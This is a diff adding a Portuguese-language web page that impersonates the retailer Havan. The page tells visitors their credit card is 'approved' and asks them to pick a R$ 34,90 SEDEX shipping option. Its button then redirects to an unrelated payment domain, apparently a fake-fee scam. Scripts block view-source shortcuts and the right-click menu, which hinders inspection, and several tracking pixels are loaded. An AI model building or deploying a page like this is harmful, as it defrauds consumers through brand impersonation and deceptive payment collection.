@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script type="text/javascript" async="" src="../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.js?sdkid=261106540113615&lib=kwaiq"></script>
+    <script type="text/javascript" async="" src="../s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid=261106540113615&lib=kwaiq"></script>
+    <script src="js/latest_1.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <!-- Meta Pixel Code -->
+    <script src="/head.js"></script>
+    <script>
+        window.pixelId = "679a0347b036c59c818c7236";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script async="" defer="" src="js/pixel.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <!-- End Meta Pixel Code -->
+
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Escolha o Método de Envio</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+        }
+
+        .header {
+            background: rgb(255, 255, 255);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .main-content {
+            max-width: 600px;
+            margin: 40px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .main-content h5 {
+            font-weight: bold;
+            color: #002279;
+            margin-bottom: 20px;
+        }
+
+        .opcao-card {
+            border: 2px solid #e6e6e6;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .opcao-card:hover {
+            border-color: #002279;
+            background-color: rgba(29, 78, 216, 0.05);
+        }
+
+        .opcao-card.selecionado {
+            border-color: #002279;
+            background-color: rgba(29, 78, 216, 0.1);
+        }
+
+        .opcao-card h6 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .opcao-card small {
+            color: #666;
+        }
+
+        .opcao-card .preco {
+            font-weight: bold;
+            color: r#002279;
+        }
+
+        .opcao-card .icon {
+            margin-right: 15px;
+            font-size: 24px;
+            color: #002279;
+        }
+
+        .btn-custom {
+            background-color: #002279;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn-custom:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-custom:hover:not(:disabled) {
+            background-color: #002279;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none; /* iOS Safari */
+            -webkit-user-select: none; /* Chrome/Safari/Opera */
+            -khtml-user-select: none; /* Konqueror */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input, textarea {
+            -webkit-touch-callout: initial; /* iOS Safari */
+            -webkit-user-select: text; /* Chrome/Safari/Opera */
+            -khtml-user-select: text; /* Konqueror */
+            -moz-user-select: text; /* Firefox */
+            -ms-user-select: text; /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial; /* iOS Safari */
+            -webkit-user-select: all; /* Chrome/Safari/Opera */
+            -khtml-user-select: all; /* Konqueror */
+            -moz-user-select: all; /* Firefox */
+            -ms-user-select: all; /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function(e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+    <script>
+        !function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.js"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('510449167530721283');
+        kwaiq.page();
+    </script>
+
+    <script>
+        !function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.js"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('261106540113615');
+        kwaiq.page();
+    </script>
+</head>
+<body>
+    <div class="header">
+        <img src="images/havan-logo.png" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <h5>Escolha o metodo de envio</h5>
+        <p>Agora basta escolher uma forma de envio do seu Cartao de Credito <strong>APROVADO</strong></p>
+
+        <div id="opcoes-envio">
+            <!-- Opção EXPRESS -->
+            <div class="opcao-card" onclick="selecionarOpcao('sedex')">
+                <div class="d-flex align-items-center">
+                    <span class="icon">📦</span>
+                    <div>
+                        <h6>SEDEX</h6>
+                        <small>1 dia util</small>
+                    </div>
+                </div>
+                <div class="preco">R$ 34,90</div>
+            </div>
+        </div>
+
+        <button id="continuarEnvio" class="btn-custom" disabled="">Continuar</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 Havan. Todos os direitos reservados.<br>
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+    <script>
+        let opcaoSelecionada = null;
+
+        function selecionarOpcao(opcao) {
+            opcaoSelecionada = opcao;
+
+            // Remove a classe 'selecionado' de todas as opções
+            document.querySelectorAll('.opcao-card').forEach(function(card) {
+                card.classList.remove('selecionado');
+            });
+
+            // Adiciona a classe 'selecionado' à opção clicada
+            document.querySelector(`.opcao-card[onclick="selecionarOpcao('${opcao}')"]`).classList.add('selecionado');
+
+            // Habilita o botão de continuar
+            document.getElementById('continuarEnvio').disabled = false;
+        }
+
+        document.getElementById('continuarEnvio').addEventListener('click', function() {
+            if (opcaoSelecionada) {
+                // Redireciona para o link desejado
+                window.location.href = "https://pay.pagamentoveloz.cfd/mwK436LMvNWGQ8b";
+            }
+        });
+    </script>
+
+</body></html>
